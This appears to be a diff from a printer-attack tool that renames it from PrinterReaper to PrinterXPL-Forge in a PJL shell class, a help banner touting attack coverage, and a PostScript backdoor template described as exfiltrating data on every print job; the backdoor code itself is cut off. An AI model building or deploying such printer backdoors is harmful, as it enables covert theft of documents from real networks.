@@ -20,7 +20,7 @@ from utils.helper import log, output, conv, file, item, chunks, const as c
 
 class pjl(printer):
     """
-    PJL v2.0 shell for PrinterReaper - Enhanced and Reorganized
+    PJL v2.0 shell for PrinterXPL-Forge - Enhanced and Reorganized
     """
 
     def __init__(self, args):
@@ -1522,7 +1522,7 @@ class pjl(printer):
         if not arg:
             print()
             from version import __version__
-            print(f"PrinterReaper v{__version__} - PJL Commands (100% Attack Coverage)")
+            print(f"PrinterXPL-Forge v{__version__} - PJL Commands (100% Attack Coverage)")
             print("=" * 70)
             print("Available command categories:")
             print("  filesystem   - File system operations (13 commands)")
@@ -2690,7 +2690,7 @@ end
             # Generate default backdoor
             backdoor_ps = """
 %!PS-Adobe-3.0
-% PrinterReaper Backdoor v1.0
+% PrinterXPL-Forge Backdoor v1.0
 % Executes on every print job for data exfiltration
 
 << /BeginPage {
